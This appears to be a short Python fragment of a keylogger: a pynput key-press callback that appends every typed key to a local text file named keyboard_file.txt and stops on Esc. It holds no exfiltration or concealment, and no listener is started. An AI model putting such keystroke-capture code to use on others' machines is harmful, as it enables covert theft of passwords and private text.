from pynput.keyboard import Key
import datetime

# creatin my keyboard listener
def onPress(key):
    if key == Key.esc:
        return False
    try:
        k = key.char
    except:
        k = key.name
        if k == "space":
            k = " "
    file1 = open('keyboard_file.txt', "a")
    file1.write(k)
    file1.close()